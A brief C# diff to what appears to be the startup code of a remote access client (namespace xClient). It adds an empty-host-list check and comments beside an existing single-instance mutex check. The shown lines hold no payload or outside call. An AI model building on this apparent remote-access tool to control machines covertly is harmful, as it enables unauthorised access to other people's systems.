@@ -122,8 +122,11 @@ namespace xClient
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
 
+            if (_hosts.IsEmpty)
+                ClientData.Disconnect = true; // no hosts to connect
+
             if (!MutexHelper.CreateMutex(Settings.MUTEX))
-                ClientData.Disconnect = true;
+                ClientData.Disconnect = true; // process with same mutex is already running
 
             if (ClientData.Disconnect)
                 return;
